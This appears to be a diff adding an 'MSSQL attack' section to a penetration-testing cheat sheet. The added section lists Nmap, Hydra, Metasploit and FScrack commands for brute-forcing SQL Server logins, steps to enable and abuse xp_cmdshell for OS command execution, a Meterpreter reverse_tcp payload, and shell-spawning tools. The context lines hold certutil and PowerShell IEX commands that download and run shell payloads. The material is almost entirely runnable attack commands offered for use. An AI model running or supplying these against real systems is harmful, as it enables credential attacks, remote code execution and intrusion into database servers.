@@ -1692,7 +1692,86 @@ cmd /c certutil -urlcache -split -f http://127.0.0.1/shell.exe c:\Temp\shell.exe
 ```
 powershell -v 2 -exec bypass IEX(New-Object Net.WebClient).downloadString("http://127.0.0.1/shell.ps1")
 ```
+# MSSQL attack
+## Service discovery
+Nmap：
+```
+nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
+```
+MetaSploit：
+```
+msf > use auxiliary/scanner/mssql/mssql_ping
+```
+Enumeration
+Combine user passwords collected in other ways into a dictionary to enumerate MSSQL machines in the domain.
 
+<b>Nmap<b/>
+```
+nmap -n -sV -Pn -vv -p<PORT> --script=banner,ms-sql-empty-password,ms-sql-dac,ms-sql-dump-hashes,ms-sql-info,ms-sql-ntlm-info,vulners -oA <IP>_mssql.txt <IP>
+nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=user.txt,passdb=pass.txt 192.168.1.1
+nmap -p 1433 --script ms-sql-brute --script-args userdb=user.txt,passdb=pass.txt 192.168.1.1
+Hydra
+hydra -L userlist_sqlbrute.txt -P quick_password_spray.txt -f -o output.ms-sql -u <IP> -s <PORT>
+```
+  <b>MetaSploit</b>
+```
+msf > use auxiliary/admin/mssql/mssql_enum
+msf > use auxiliary/scanner/mssql/mssql_login
+Set it up PASS_FILE and RHOSTS.
+```
+  <b>PowerUpSQL</b>
+```
+Invoke-SQLAuditWeakLoginPw
+```
+<b>FScrack<b/>
+```
+python FScrack.py -h 192.168.1 -p 1433 -d pass.txt
+```
+## Exploitation
+Nmap：
+```
+nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell 192.168.1.10
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="whoami" 192.168.1.10
+```
+MetaSploit：
+```
+msf > auxiliary/admin/mssql/mssql_exec
+msf > auxiliary/admin/mssql/mssql_sql 
+Rebound
+msf > use exploit/windows/mssql/mssql_payload msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp 
+```
+<b>MSDAT</b>
+
+All the included above could be tested using MSDAT only.
+<br>
+Getting a shell
+```
+msdat.py xpcmdshell -s $SERVER -p $PORT -U $USER -P $PASSWORD --shell
+mssql_shell python script
+```
+
+<b>python [mssql_shell.py](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py) script</b>
+```
+Usage : mssql_shell Change MSSQL_SERVE , MSSQL_USERNAME and MSSQL_PASSWORD
+```
+<b>Sqsh</b>
+Connect to the service 
+```
+sqsh -S mssql -D MyDB -U DOMAIN\\testuser -P MyTestingClearPassword1
+```
+Then
+```
+exec sp_configure ‘show advanced options’, 1
+go
+reconfigure
+go
+exec sp_configure ‘xp_cmdshell’, 1
+go
+reconfigure
+go
+xp_cmdshell 'dir C:\'
+go
+```
 # C&C
 
 ## Merlin
